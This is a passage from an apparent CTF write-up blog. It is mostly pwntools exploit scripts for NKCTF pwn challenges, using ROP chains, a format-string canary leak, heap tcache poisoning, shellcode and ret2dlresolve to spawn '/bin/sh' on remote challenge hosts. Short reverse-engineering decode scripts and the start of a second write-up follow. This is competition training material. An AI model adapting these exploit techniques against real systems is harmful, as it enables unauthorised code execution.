<h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>

<h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ez-baby-apk"><a href="#ez-baby-apk" class="headerlink" title="ez_baby_apk"></a>ez_baby_apk</h2><p>使用jadx加雷电模拟器进行调试</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-1.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-2.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-3.png"></p>
<h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/PMKF-1.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure>

<h2 id="babyrust"><a href="#babyrust" class="headerlink" title="babyrust"></a>babyrust</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/babyrust-1.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>nkctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2021NUAA-wp</title>
    <url>/wp/2021NUAA-wp.html</url>
    <content><![CDATA[<p>时间有点紧，有几题差一点<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/nuaa%E6%8E%92%E5%90%8D-1.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/nuaa%E6%8E%92%E5%90%8D-2.png"></p>
<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>腾讯会议<br>flag{we1c0m_t0_asur!ctf}</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="baby-mix"><a href="#baby-mix" class="headerlink" title="baby_mix"></a>baby_mix</h2><p>伪加密，09改成00<br>图片上边左边看到白条，应该是lsb<br>stegsolve查看得到二维码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/baby_mix-1.png"><br>扫码得到</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">4</span>a<span class="hljs-number">5</span>a<span class="hljs-number">4</span>a<span class="hljs-number">584732544748424658515654514</span>f<span class="hljs-number">4634575135435447564</span>a<span class="hljs-number">4749564</span>a<span class="hljs-number">5347463455595754564</span>f<span class="hljs-number">464</span><span class="hljs-keyword">c</span><span class="hljs-number">444</span>f<span class="hljs-number">5752594</span>f<span class="hljs-number">56465751334</span>b<span class="hljs-number">55474</span>a<span class="hljs-number">345841324</span>b<span class="hljs-number">494</span>b<span class="hljs-number">4</span>a<span class="hljs-number">3546495533594</span>b<span class="hljs-number">524</span>a<span class="hljs-number">4449524</span>b<span class="hljs-number">454</span>b<span class="hljs-number">35435753334</span><span class="hljs-keyword">c</span><span class="hljs-number">324</span>f<span class="hljs-number">4</span>a<span class="hljs-number">41564153534</span>f<span 